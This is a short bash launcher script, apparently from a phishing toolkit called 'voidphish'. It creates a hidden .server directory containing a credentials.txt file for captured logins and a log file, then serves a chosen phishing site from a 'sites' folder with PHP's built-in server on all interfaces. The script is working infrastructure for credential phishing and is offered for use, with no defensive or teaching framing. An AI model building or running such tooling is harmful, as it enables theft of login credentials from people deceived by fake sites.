#!/bin/bash

# ANSI colors
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
RESET="\033[0m"

# Server configuration
SERVER_DIR=".server"
CRED_FILE="${SERVER_DIR}/credentials.txt"
LOG_FILE="${SERVER_DIR}/voidphish.log"
site=$1
port=$2

# Check if the server directory exists
if [[ ! -d "$SERVER_DIR" ]]; then
    mkdir -p "$SERVER_DIR"
fi

# Create credential file if it doesn't exist
if [[ ! -f "$CRED_FILE" ]]; then
    touch "$CRED_FILE"
fi

# Create log file if it doesn't exist
if [[ ! -f "$LOG_FILE" ]]; then
    touch "$LOG_FILE"
fi

echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Starting PHP server on port $port..."
cd sites/$site && php -S 0.0.0.0:$port > /dev/null 2>&1 &
server_pid=$!
echo $server_pid > "../../${SERVER_DIR}/server.pid"

echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} PHP server started!"
